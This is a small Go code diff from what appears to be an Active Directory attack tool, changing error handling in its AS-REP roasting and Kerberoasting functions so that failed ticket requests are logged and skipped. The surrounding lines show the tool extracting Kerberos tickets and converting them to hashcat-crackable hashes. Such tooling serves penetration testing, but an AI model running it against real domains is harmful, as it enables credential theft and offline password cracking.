@@ -39,7 +39,8 @@ func (o *Options) asreproast(target string) {
 		name := UnpackToString(samaccountname)
 		asrep, err := krb5client.GetAsReqTgt(name)
 		if err != nil {
-			return err
+			prt.StoreFailure(err.Error())
+			return nil
 		}
 		hash := optkrb5.ASREPToHashcat(*asrep.Ticket)
 		//prt.Store(name, fmt.Sprintf("%s...%s", hash[:30], hash[len(hash)-10:]))
@@ -110,7 +111,8 @@ func (o *Options) kerberoast(target string) {
 
 			tgs, err := krb5client.GetServiceTicket(name, spn)
 			if err != nil {
-				return err
+				prt.StoreFailure(err.Error())
+				return nil
 			}
 
 			hash := optkrb5.TGSToHashcat(tgs.Ticket, name)
